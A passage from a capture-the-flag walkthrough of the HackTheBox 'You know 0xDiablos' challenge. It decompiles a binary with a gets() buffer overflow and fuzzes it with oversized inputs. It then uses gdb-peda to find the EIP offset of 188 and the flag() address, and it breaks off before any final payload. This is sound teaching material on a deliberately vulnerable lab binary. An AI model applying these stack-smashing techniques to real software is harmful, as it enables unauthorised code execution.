</span></span></span><span class=line><span class=cl><span class=s2>.fini_array
</span></span></span><span class=line><span class=cl><span class=s2>.dynamic
</span></span></span><span class=line><span class=cl><span class=s2>.got
</span></span></span><span class=line><span class=cl><span class=s2>.got.plt
</span></span></span><span class=line><span class=cl><span class=s2>.data
</span></span></span><span class=line><span class=cl><span class=s2>.bss
</span></span></span><span class=line><span class=cl><span class=s2>.comment
</span></span></span><span class=line><span class=cl><span class=s2>┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos]
</span></span></span><span class=line><span class=cl><span class=s2>└──╼ [★]</span>$<span class=s2>
</span></span></span></code></pre></div><h2 id=reverse-engineering--static-analysis><strong>REVERSE-ENGINEERING&ndash;STATIC-ANALYSIS</strong><a hidden class=anchor aria-hidden=true href=#reverse-engineering--static-analysis>#</a></h2><p>No flag there, so we move on and try <strong>disassembling</strong> it with <em><strong>ghidra</strong></em>. A bit of <strong>reverse engineering</strong>, <strong>static analysis</strong> in particular <strong>reveals</strong> the following:</p><ul><li><em><strong>main()</strong></em> calls <em><strong>vuln()</strong></em>, which does nothing except reading some data from a specific location and writing it back</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>vuln</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>local_bc</span> <span class=p>[</span><span class=mi>180</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>local_bc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>local_bc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li><em><strong>vuln()</strong></em> uses the <em><strong>gets</strong></em> function which is known to be <strong>susceptible</strong> to <strong>buffer overflows</strong></li><li>it is important to note, that it uses a <strong>180 character long array</strong> to store the value it reads and echoes back</li><li>the <em><strong>flag()</strong></em> function simply opens up <em>flag.txt</em> for reading, does some verification on the two parameters, and if they are correct, returns some value.</li></ul><p><img loading=lazy src=/walkthroughs/htb/beginner-track/you-know-0xdiablos/ghidra-flag-function.png alt=ghidra-flag-function title=ghidra-flag-function></p><p>This is how the <strong>decompiled</strong> source code for the <strong>flag()</strong> function looks like.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>flag</span><span class=p>(</span><span class=kt>int</span> <span class=n>param_1</span><span class=p>,</span><span class=kt>int</span> <span class=n>param_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>local_50</span> <span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>local_10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>local_10</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>local_50</span><span class=p>,</span><span class=mh>0x40</span><span class=p>,</span><span class=n>local_10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>param_1</span> <span class=o>==</span> <span class=o>-</span><span class=mh>0x21524111</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>param_2</span> <span class=o>==</span> <span class=o>-</span><span class=mh>0x3f212ff3</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=n>local_50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Hurry up and try in on server side.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <strong>parameter check</strong> especially seems very important,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=n>param_1</span> <span class=o>==</span> <span class=o>-</span><span class=mh>0x21524111</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>param_2</span> <span class=o>==</span> <span class=o>-</span><span class=mh>0x3f212ff3</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>therefore, we use the <em><strong>ghidra&rsquo;s</strong></em> built-in functionality to <strong>convert</strong> the two <strong>hex</strong> values into <strong>character strings</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=n>param_1</span> <span class=o>==</span> <span class=n>L</span><span class=err>&#39;\</span><span class=n>xdeadbeef</span><span class=err>&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>param_2</span> <span class=o>==</span> <span class=n>L</span><span class=err>&#39;\</span><span class=n>xc0ded00d</span><span class=err>&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p><img loading=lazy src=/walkthroughs/htb/beginner-track/you-know-0xdiablos/ghidra-flag-function-chars.png alt=ghidra-flag-function-chars title=ghidra-flag-function-chars></p><p>It looks like we are already in the possession of all the missing <strong>pieces</strong> and it&rsquo;s time to finally put them <strong>together</strong>. So in a nutshell, we have a <strong>buffer overflow</strong> and a function (<em><strong>flag()</strong></em>) which we want to <strong>run</strong>.</p><h2 id=buffer-overflow-vulnerabilities><strong>BUFFER-OVERFLOW-VULNERABILITIES</strong><a hidden class=anchor aria-hidden=true href=#buffer-overflow-vulnerabilities>#</a></h2><p>Therefore, our main idea here is to <strong>overwrite</strong> the <strong>return address</strong> stored on the <strong>stack</strong> for the <em><strong>vuln()</strong></em> function, so that when the program <em><strong>returns</strong></em> from <em><strong>vuln()</strong></em>, the execution continues with the <em><strong>flag()</strong></em> function.</p><p>There is a <strong>very nice</strong> <a href=https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/ title="blog post">blog post</a> available explaining <strong>buffer overflows</strong> and <strong>stack canaries</strong> in more detail.</p><p>But for now, these are some <strong>important</strong> things to know about when working with <strong>functions calls</strong>:</p><ul><li>before <strong>calling a function</strong>, the <strong>next instruction</strong> is <strong>pushed</strong> to the <strong>stack</strong></li><li>once the <strong>function returns</strong>, the previously pushed <strong>instruction</strong> is <strong>popped</strong> from the <strong>stack</strong></li><li>regarding memory layout: <strong>stack grows downward</strong></li><li><strong>parameters</strong> are put <strong>on stack</strong> <strong>before</strong> the <strong>function</strong> is called &ndash; in our case our <strong>stack frame</strong> could look like this when calling - <em><strong>flag</strong></em> <em>(param_1, param_2)</em> -</li></ul><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><em>Previous frame</em></td><td></td></tr><tr><td><em><strong>param_2</strong></em></td><td></td></tr><tr><td><em><strong>param_1</strong></em></td><td></td></tr><tr><td><strong>Return address</strong></td><td></td></tr><tr><td><em>Previous frame address</em></td><td></td></tr><tr><td><em>Local variables</em></td><td></td></tr><tr><td><em>Free memory</em></td><td></td></tr></tbody></table><p>This idea of <strong>overwriting</strong> the <strong>return address</strong> with a <strong>buffer overflow</strong> is called <strong>smashing the stack</strong> and it&rsquo;s steps can briefly explained as:</p><ol><li>function contains a <strong>buffer variable</strong> allocated on stack &ndash; in our case, this is the <em><strong>local_bc</strong></em> variable in <em><strong>vuln()</strong></em></li><li>function copies user-controlled data to buffer <strong>without</strong> <strong>verifying</strong> that data size is smaller that buffer &ndash; <em><strong>vuln()</strong></em> does exactly that, the <em><strong>gets()</strong></em> function does <strong>no verification</strong></li><li>user data <strong>overwrites</strong> other <strong>variables on stack</strong>, up to <strong>return address</strong> saved in stack frame &ndash; we would overwrite the <strong>return address</strong> for <em><strong>vuln()</strong></em> with the starting address of the <em><strong>flag()</strong></em> function</li><li>when procedure returns, program <strong>fetches</strong> <strong>return address</strong> from <strong>stack</strong> and copies it to <strong>EIP</strong> (instruction pointer) register &ndash; when the next instruction is executed, execution jumps to the <em><strong>flag()</strong></em> function</li><li>program is now <strong>executing</strong> our code &ndash; in our case the <em><strong>flag()</strong></em> function</li></ol><p>So the <strong>stack frames</strong> for the <em><strong>vuln()</strong></em> function could look like this:</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><em>Previous frame</em> - in <em><strong>main()</strong></em></td><td></td></tr><tr><td><strong>Return address</strong> for <em><strong>vuln()</strong></em> &ndash; <strong>OVERWRITE</strong></td><td></td></tr><tr><td><strong>Previous frame address</strong> &ndash; (old <em><strong>ebp</strong></em>) &ndash; <strong>OVERWRITE</strong></td><td></td></tr><tr><td><em>local variables</em> &ndash; <em><strong>local_bc</strong></em></td><td></td></tr><tr><td><em>Free memory</em></td><td></td></tr></tbody></table><p>Let&rsquo;s try and do a <strong>quick check</strong> by generating some garbage data that&rsquo;s <strong>at least</strong> 180 character long. The <em><strong>local_bc</strong></em> variable in <em><strong>vuln()</strong></em> is a 180 char long buffer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>python -c <span class=s2>&#34;print(&#39;A&#39;*180)&#34;</span> <span class=p>|</span> ./vuln
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -c <span class=s2>&#34;print(&#39;A&#39;*180)&#34;</span> <span class=p>|</span> ./vuln
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -c <span class=s2>&#34;print(&#39;A&#39;*181)&#34;</span> <span class=p>|</span> ./vuln
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -c <span class=s2>&#34;print(&#39;A&#39;*182)&#34;</span> <span class=p>|</span> ./vuln
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -c <span class=s2>&#34;print(&#39;A&#39;*183)&#34;</span> <span class=p>|</span> ./vuln
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -c <span class=s2>&#34;print(&#39;A&#39;*184)&#34;</span> <span class=p>|</span> ./vuln
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class=line><span class=cl>Segmentation fault
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -c <span class=s2>&#34;print(&#39;A&#39;*185)&#34;</span> <span class=p>|</span> ./vuln
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class=line><span class=cl>Segmentation fault
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>We get a <strong>segmentation fault</strong> back for 184 characters and above, which is usually the first <strong>indicator</strong> for a <strong>buffer overflow</strong> <strong>vulnerability</strong>. It means, that the we have successfully <strong>overwritten</strong> the <strong>return address</strong> with some garbage (A&rsquo;s) and the program breaks down because that address is not valid.</p><h2 id=gdb-peda><strong>GDB-PEDA</strong><a hidden class=anchor aria-hidden=true href=#gdb-peda>#</a></h2><p>Our next course of action is to find out the <em><strong>flag()</strong></em> function&rsquo;s <strong>memory address</strong>. But since working on <strong>buffer overflows</strong> is always easier when <em><strong>gdb</strong></em> is teamed up with <em><strong>peda</strong></em>, let&rsquo;s install it first.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>git clone https://github.com/longld/peda.git ~/peda
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ git clone https://github.com/longld/peda.git ~/peda
</span></span><span class=line><span class=cl>Cloning into <span class=s1>&#39;/home/htb-bluewalle/peda&#39;</span>...
</span></span><span class=line><span class=cl>remote: Enumerating objects: 382, <span class=k>done</span>.
</span></span><span class=line><span class=cl>remote: Counting objects: 100% <span class=o>(</span>9/9<span class=o>)</span>, <span class=k>done</span>.
</span></span><span class=line><span class=cl>remote: Compressing objects: 100% <span class=o>(</span>7/7<span class=o>)</span>, <span class=k>done</span>.
</span></span><span class=line><span class=cl>remote: Total <span class=m>382</span> <span class=o>(</span>delta 2<span class=o>)</span>, reused <span class=m>8</span> <span class=o>(</span>delta 2<span class=o>)</span>, pack-reused <span class=m>373</span>
</span></span><span class=line><span class=cl>Receiving objects: 100% <span class=o>(</span>382/382<span class=o>)</span>, 290.84 KiB <span class=p>|</span> 5.10 MiB/s, <span class=k>done</span>.
</span></span><span class=line><span class=cl>Resolving deltas: 100% <span class=o>(</span>231/231<span class=o>)</span>, <span class=k>done</span>.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;source ~/peda/peda.py&#34;</span> &gt;&gt; ~/.gdbinit
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>echo</span> <span class=s2>&#34;source ~/peda/peda.py&#34;</span> &gt;&gt; ~/.gdbinit
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Once everything is set up, we run <em><strong>gdb</strong></em> on our <strong>executable</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>gdb vuln -q
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gdb vuln -q
</span></span><span class=line><span class=cl>Reading symbols from vuln...
</span></span><span class=line><span class=cl><span class=o>(</span>No debugging symbols found in vuln<span class=o>)</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>Once nice thing about <em><strong>peda</strong></em> that it already includes most of the tools you would need for <strong>payload generation</strong>. Let&rsquo;s create a <strong>pattern/payload</strong> that definitely results in a <strong>segmentation fault</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>pattern_create <span class=m>200</span> payload-200.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ pattern_create --help
</span></span><span class=line><span class=cl>Generate a cyclic pattern
</span></span><span class=line><span class=cl>Set <span class=s2>&#34;pattern&#34;</span> option <span class=k>for</span> basic/extended pattern <span class=nb>type</span>
</span></span><span class=line><span class=cl>Usage:
</span></span><span class=line><span class=cl>    pattern_create size <span class=o>[</span>file<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gdb-peda$ pattern_create <span class=m>200</span> pattern-200.txt
</span></span><span class=line><span class=cl>Writing pattern of <span class=m>200</span> chars to filename <span class=s2>&#34;pattern-200.txt&#34;</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>Then we <strong>feed</strong> this <strong>payload</strong> to our <strong>executable</strong> when <strong>running</strong> it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>run &lt; pattern-200.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ run &lt; pattern-200.txt 
</span></span><span class=line><span class=cl>Starting program: /home/htb-bluewalle/you-know-0xdiablos/vuln &lt; pattern-200.txt
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAA%AAsAABAA<span class=nv>$AAnAACAA</span>-AA<span class=o>(</span>AADAA<span class=p>;</span>AA<span class=o>)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl><span class=o>[</span>----------------------------------registers-----------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>EAX: 0xc9 
</span></span><span class=line><span class=cl>EBX: 0x76414158 <span class=o>(</span><span class=s1>&#39;XAAv&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ECX: 0xffffffff 
</span></span><span class=line><span class=cl>EDX: 0xffffffff 
</span></span><span class=line><span class=cl>ESI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EDI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EBP: 0x41594141 <span class=o>(</span><span class=s1>&#39;AAYA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ESP: 0xffffd060 <span class=o>(</span><span class=s2>&#34;ZAAxAAyA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EIP: 0x41417741 <span class=o>(</span><span class=s1>&#39;AwAA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EFLAGS: 0x10286 <span class=o>(</span>carry PARITY adjust zero SIGN <span class=nb>trap</span> INTERRUPT direction overflow<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-------------------------------------code-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Invalid <span class=nv>$PC</span> address: 0x41417741
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------stack-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>0000<span class=p>|</span> 0xffffd060 <span class=o>(</span><span class=s2>&#34;ZAAxAAyA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0004<span class=p>|</span> 0xffffd064 <span class=o>(</span><span class=s2>&#34;AAyA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0008<span class=p>|</span> 0xffffd068 --&gt; 0xffffd100 --&gt; 0x1 
</span></span><span class=line><span class=cl>0012<span class=p>|</span> 0xffffd06c --&gt; 0x3eb 
</span></span><span class=line><span class=cl>0016<span class=p>|</span> 0xffffd070 --&gt; 0xffffd090 --&gt; 0x1 
</span></span><span class=line><span class=cl>0020<span class=p>|</span> 0xffffd074 --&gt; 0x0 
</span></span><span class=line><span class=cl>0024<span class=p>|</span> 0xffffd078 --&gt; 0x0 
</span></span><span class=line><span class=cl>0028<span class=p>|</span> 0xffffd07c --&gt; 0xf7de0e46 <span class=o>(</span>&lt;__libc_start_main+262&gt;:	add    esp,0x10<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------------------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Legend: code, data, rodata, value
</span></span><span class=line><span class=cl>Stopped reason: SIGSEGV
</span></span><span class=line><span class=cl>0x41417741 in ?? <span class=o>()</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>Great, the program <strong>broke down</strong> because the <strong>EIP</strong> (<em>extended instruction pointer</em>) was <strong>overwritten</strong> with our garbage data. Currently it holds - <em>(&lsquo;AwAA&rsquo;)</em> - which is simply junk data, but it should had the <strong>return address</strong> when returning from the <em><strong>vuln()</strong></em> to <em><strong>main()</strong></em>.</p><p>So our goal now is controlling what exactly get&rsquo;s written into this <strong>register</strong>. For that, we need to find the <strong>offset</strong>. Put simply, exactly just how many characters are before this - <em>(&lsquo;AwAA&rsquo;)</em> - character string? Let&rsquo;s check the <strong>offset</strong> for the <em><strong>EIP</strong></em> which contains the value of - <em>0x41417741</em> or <em>AwAA&rsquo;</em> -.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>pattern_offset 0x41417741
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ pattern_offset 0x41417741
</span></span><span class=line><span class=cl><span class=m>1094809409</span> found at offset: <span class=m>188</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>It looks like our <strong>offset</strong> is at <em>188</em>. Now, to <strong>redirect</strong> the execution flow to the <em><strong>flag()</strong></em> function, we first need to know it&rsquo;s starting <strong>address</strong>. This <strong>memory address</strong> - <em>0x080491e2</em> - is the first address we find when we <strong>disassemble</strong> the <em><strong>flag()</strong></em> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>disass flag
